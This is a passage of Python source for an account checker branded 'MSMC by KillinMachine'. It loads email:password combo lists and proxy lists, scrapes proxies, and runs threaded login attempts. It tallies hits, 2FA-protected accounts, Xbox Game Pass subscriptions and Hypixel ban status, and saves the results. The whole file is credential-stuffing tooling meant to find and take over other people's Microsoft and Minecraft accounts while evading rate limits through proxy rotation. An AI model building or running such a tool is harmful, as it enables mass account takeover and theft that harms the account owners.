            banproxies.clear()
            for line in ext:
                raw = line.split()[0].strip() if line.split() else ""
                if raw:
                    banproxies.append(raw)
            print(Fore.LIGHTBLUE_EX + f"Loaded [{len(banproxies)}] lines.")
            time.sleep(1)
            return
        except Exception:
            print(Fore.LIGHTRED_EX + "Your file is probably harmed.")
            time.sleep(1)



_cpm_lock = threading.Lock()
_cpm_window = 0


def _render_stats() -> str:
    return (
        f" [{checked}\\{len(Combos)}] Checked\n"
        f" [{hits}] Hits\n"
        f" [{bad}] Bad\n"
        f" [{sfa}] SFA\n"
        f" [{mfa}] MFA\n"
        f" [{twofa}] 2FA\n"
        f" [{xgp}] Xbox Game Pass\n"
        f" [{xgpu}] Xbox Game Pass Ultimate\n"
        f" [{other}] Other\n"
        f" [{vm}] Valid Mail\n"
        f" [{retries}] Retries\n"
        f" [{errors}] Errors\n"
    )


def logscreen() -> None:
    global cpm, _cpm_window
    while True:
        with _cpm_lock:
            _cpm_window = cpm
            cpm = 0
        title = (f"MSMC by KillinMachine | Checked: {checked}\\{len(Combos)}  -  Hits: {hits}  -  "
                 f"Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  "
                 f"XGP: {xgp}  -  XGPU: {xgpu}  -  VM: {vm}  -  Other: {other}  -  "
                 f"Cpm: {_cpm_window * 60}  -  Retries: {retries}  -  Errors: {errors}")
        set_console_title(title)
        time.sleep(1)


def cuiscreen() -> None:
    global cpm, _cpm_window
    while True:
        with _cpm_lock:
            _cpm_window = cpm
            cpm = 0
        clear_console()
        print(logo)
        print(_render_stats())
        set_console_title(
            f"MSMC by KillinMachine | Checked: {checked}\\{len(Combos)}  -  Hits: {hits}  -  "
            f"Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  "
            f"XGP: {xgp}  -  XGPU: {xgpu}  -  VM: {vm}  -  Other: {other}  -  "
            f"Cpm: {_cpm_window * 60}  -  Retries: {retries}  -  Errors: {errors}"
        )
        time.sleep(1)


def finishedscreen() -> None:
    print(logo)
    print()
    print(Fore.LIGHTGREEN_EX + "Finished Checking!")
    print()
    print(f"Hits: {hits}")
    print(f"Bad: {bad}")
    print(f"SFA: {sfa}")
    print(f"MFA: {mfa}")
    print(f"2FA: {twofa}")
    print(f"Xbox Game Pass: {xgp}")
    print(f"Xbox Game Pass Ultimate: {xgpu}")
    print(f"Other: {other}")
    print(f"Valid Mail: {vm}")
    print(Fore.LIGHTRED_EX + "Press any key to exit.")
    try:
        if HAS_READCHAR:
            readchar.readkey()
        else:
            input()
    except Exception:
        pass



def Checker(combo: str) -> None:
    global bad, checked, cpm
    try:
        stripped = combo.strip().replace(" ", "")
        if ":" not in stripped:
            raise ValueError("no separator")
        email, password = stripped.split(":", 1)
        if not email or not password:
            raise ValueError("empty")
        authenticate(email, password)
    except Exception:
        if _screen == "'2'":
            print(Fore.RED + f"Bad: {combo.strip()}")
        bad += 1; cpm += 1; checked += 1



def _ask_choice(prompt: str, allowed: str) -> str:
    """Return a repr'd choice like '2' (matching original format)."""
    while True:
        print(Fore.LIGHTBLUE_EX + prompt, end="", flush=True)
        if HAS_READCHAR:
            ch = readchar.readkey()
            print(ch)
        else:
            ch = input().strip()[:1]
        if ch in allowed:
            return repr(ch)
        print(Fore.RED + f"Invalid choice [{ch}]")


def Main() -> None:
    global _proxy_type, _screen
    set_console_title("MSMC by KillinMachine")
    clear_console()

    try:
        loadconfig()
    except Exception:
        print(Fore.RED + "Error loading config. Delete config.ini and retry.")
        input()
        return

    print(logo)

    if not HAS_PYCRAFT:
        print(Fore.YELLOW + "[warn] pyCraft not installed — Hypixel ban check disabled.")
    if not HAS_SOCKS:
        print(Fore.YELLOW + "[warn] PySocks not installed — SOCKS proxy support disabled.")
    if not HAS_TK:
        print(Fore.YELLOW + "[warn] tkinter not available — file dialogs will use terminal prompts.")
    if not HAS_READCHAR:
        print(Fore.YELLOW + "[warn] readchar not installed — using input() for menu keys.")

    while True:
        try:
            thread = int(input(Fore.LIGHTBLUE_EX + "Threads: ").strip())
            if thread < 1:
                raise ValueError
            break
        except Exception:
            print(Fore.LIGHTRED_EX + "Must be a positive number.")

    _proxy_type = _ask_choice("Proxy Type: [1] Http [2] Socks4 [3] Socks5 [4] None [5] Auto: ", "12345")
    _screen     = _ask_choice("Screen: [1] CUI [2] Log: ", "12")

    print(Fore.LIGHTBLUE_EX + "Select your combos")
    Load()

    if _proxy_type not in ("'4'", "'5'"):
        print(Fore.LIGHTBLUE_EX + "Select your proxies")
        Proxys()

    if not config.get("proxylessban") and config.get("hypixelban") and HAS_PYCRAFT:
        print(Fore.LIGHTBLUE_EX + "Select your SOCKS5 Ban Checking Proxies.")
        banproxyload()

    if _proxy_type == "'5'":
        print(Fore.LIGHTGREEN_EX + "Scraping Proxies Please Wait.")
        threading.Thread(target=get_proxies, daemon=True).start()
        waited = 0
        while not proxylist and waited < 30:
            time.sleep(1)
            waited += 1
        if not proxylist:
            print(Fore.YELLOW + "[warn] no proxies scraped yet, continuing...")

    os.makedirs("results", exist_ok=True)
    os.makedirs(f"results/{fname}", exist_ok=True)

    if _screen == "'1'":
        threading.Thread(target=cuiscreen, daemon=True).start()
    else:
        threading.Thread(target=logscreen, daemon=True).start()

    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as ex:
        futures = [ex.submit(Checker, c) for c in Combos]
        concurrent.futures.wait(futures)

    finishedscreen()


if __name__ == "__main__":
    try:
        Main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\nInterrupted.")
        sys.exit(0)
    except Exception:
        traceback.print_exc()
        sys.exit(1)